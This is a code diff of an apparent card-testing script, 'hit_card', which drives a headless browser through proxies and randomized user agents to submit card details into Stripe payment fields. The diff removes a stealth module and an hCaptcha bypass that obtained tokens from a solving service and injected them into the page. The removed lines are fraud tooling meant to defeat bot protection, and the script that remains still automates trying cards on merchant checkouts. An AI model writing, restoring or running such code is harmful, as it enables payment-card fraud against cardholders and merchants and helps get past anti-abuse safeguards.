@@ -5,11 +5,9 @@ import os
 import httpx
 import traceback
 from playwright.async_api import async_playwright
-import playwright_stealth
 from dotenv import load_dotenv
 
 load_dotenv()
-AZAPI_KEY = os.getenv("AZAPI_KEY")
 
 # User Agents for randomization
 USER_AGENTS = [
@@ -48,59 +46,12 @@ async def hit_card(url, card_str, proxy=None):
         
         page = await context.new_page()
         
-        # Apply stealth (handle different package versions resiliently)
-        try:
-            # Try original call
-            await playwright_stealth.stealth(page)
-        except (TypeError, AttributeError):
-            try:
-                # Try nested call (fixed some alternative package versions)
-                await playwright_stealth.stealth.stealth(page)
-            except:
-                print("⚠️ Stealth could not be applied via standard method, continuing anyway...")
-        except Exception as e:
-            print(f"⚠️ Stealth Error: {e}")
-        
         print(f"🚀 Navigating to: {url}")
         try:
             await page.goto(url, wait_until="networkidle", timeout=60000)
             
-            # --- hCaptcha Check ---
-            print("🔍 Checking for hCaptcha...")
-            hcaptcha_iframe = await page.query_selector('iframe[src*="hcaptcha.com"]')
-            if hcaptcha_iframe:
-                print("🧩 hCaptcha detected! Attempting to solve with Azapi...")
-                # Extract sitekey
-                src = await hcaptcha_iframe.get_attribute("src")
-                sitekey = None
-                if "sitekey=" in src:
-                    sitekey = src.split("sitekey=")[1].split("&")[0]
-                
-                if sitekey and AZAPI_KEY:
-                    print(f"🔑 Sitekey: {sitekey}")
-                    async with httpx.AsyncClient() as client:
-                        resp = await client.post(
-                            "https://api.azapi.ai/h0001c",
-                            headers={"Authorization": AZAPI_KEY},
-                            json={"sitekey": sitekey, "pageurl": url},
-                            timeout=60.0
-                        )
-                        result = resp.json()
-                        if result.get("success") and result.get("data", {}).get("solution"):
-                            token = result["data"]["solution"]
-                            print("✅ hCaptcha Solved! Injecting token...")
-                            await page.evaluate(f"""
-                                document.getElementsByName('h-captcha-response').forEach(el => el.innerHTML = '{token}');
-                                document.getElementsByName('g-recaptcha-response').forEach(el => el.innerHTML = '{token}');
-                                if (window.hcaptcha) {{
-                                    window.hcaptcha.execute(); 
-                                }}
-                            """)
-                            await asyncio.sleep(2)
-                        else:
-                            print(f"❌ Azapi Failed: {result.get('message', 'Unknown error')}")
-                else:
-                    print("⚠️ Could not find sitekey or AZAPI_KEY missing.")
+            # --- hCaptcha Check (REMOVED) ---
+            pass
 
             # Find Stripe Iframes
             print("⏳ Waiting for Stripe fields...")
@@ -197,7 +148,8 @@ async def hit_card(url, card_str, proxy=None):
         except Exception as e:
             print(f"ERROR: {str(e)}")
             print(traceback.format_exc())
-            # Ensure browser is closed
+        finally:
+            # Ensure browser and context are closed
             try:
                 await browser.close()
             except:
